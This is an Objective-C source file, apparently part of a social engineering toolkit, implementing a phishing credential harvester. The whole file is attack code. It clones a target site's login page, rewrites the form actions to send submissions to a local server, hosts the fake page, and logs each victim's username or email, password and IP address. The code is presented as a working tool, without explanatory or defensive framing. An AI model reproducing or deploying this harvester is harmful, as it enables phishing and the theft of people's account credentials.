//
//  CredentialHarvester.m
//  Social Engineering Toolkit
//

#import "CredentialHarvester.h"
#import "../../SETCore/Managers/SETHTTPServer.h"
#import "../../SETCore/Managers/SETLoggingManager.h"

@interface CredentialHarvester () <SETHTTPServerDelegate>
@property (strong, nonatomic) SETHTTPServer *server;
@property (copy, nonatomic) NSString *clonedSitePath;
@end

@implementation CredentialHarvester

- (void)startHarvestingWithURL:(NSString *)urlToClone onPort:(NSInteger)port {
    // Create temporary directory for cloned site
    NSString *tempDir = [NSTemporaryDirectory() stringByAppendingPathComponent:@"SET_Clone"];
    [[NSFileManager defaultManager] createDirectoryAtPath:tempDir
                              withIntermediateDirectories:YES
                                               attributes:nil
                                                    error:nil];
    self.clonedSitePath = tempDir;
    
    // Clone the login page
    if ([self cloneLoginPage:urlToClone toLocalPath:tempDir]) {
        // Start HTTP server
        self.server = [[SETHTTPServer alloc] init];
        self.server.delegate = self;
        [self.server startOnPort:port withDocumentRoot:tempDir];
        
        [[SETLoggingManager sharedLogger] logMessage:[NSString stringWithFormat:@"Credential harvester started on port %ld, cloned from %@", (long)port, urlToClone]
                                           withLevel:SETLogLevelInfo];
    } else {
        [[SETLoggingManager sharedLogger] logMessage:@"Failed to clone login page" withLevel:SETLogLevelError];
    }
}

- (BOOL)cloneLoginPage:(NSString *)sourceURL toLocalPath:(NSString *)localPath {
    // Download the source HTML
    NSURL *url = [NSURL URLWithString:sourceURL];
    NSURLRequest *request = [NSURLRequest requestWithURL:url];
    NSError *error = nil;
    
    NSData *htmlData = [NSURLConnection sendSynchronousRequest:request returningResponse:nil error:&error];
    
    if (error || !htmlData) {
        return NO;
    }
    
    NSString *htmlString = [[NSString alloc] initWithData:htmlData encoding:NSUTF8StringEncoding];
    
    // Modify form actions to point to our server
    // This is a simplified example - production would need more robust parsing
    htmlString = [htmlString stringByReplacingOccurrencesOfString:@"action=\""
                                                        withString:@"action=\"http://localhost:8080/"];
    htmlString = [htmlString stringByReplacingOccurrencesOfString:@"action='"
                                                        withString:@"action='http://localhost:8080/"];
    
    // Save modified HTML
    NSString *indexPath = [localPath stringByAppendingPathComponent:@"index.html"];
    [htmlString writeToFile:indexPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    
    return YES;
}

- (void)stopHarvesting {
    [self.server stop];
    [[SETLoggingManager sharedLogger] logMessage:@"Credential harvester stopped" withLevel:SETLogLevelInfo];
}

#pragma mark - SETHTTPServerDelegate

- (void)serverDidReceivePOSTRequest:(NSDictionary *)postData fromIP:(NSString *)clientIP {
    // Log captured credentials
    NSString *username = postData[@"username"] ?: postData[@"email"] ?: @"unknown";
    NSString *password = postData[@"password"] ?: @"unknown";
    
    [[SETLoggingManager sharedLogger] logCredential:username password:password fromSource:clientIP];
}

- (void)serverDidStartOnPort:(NSInteger)port {
    [[SETLoggingManager sharedLogger] logMessage:[NSString stringWithFormat:@"Harvester server running on port %ld", (long)port]
                                       withLevel:SETLogLevelInfo];
}

- (void)serverDidFailWithError:(NSError *)error {
    [[SETLoggingManager sharedLogger] logMessage:[NSString stringWithFormat:@"Server error: %@", error.localizedDescription]
                                       withLevel:SETLogLevelError];
}

@end
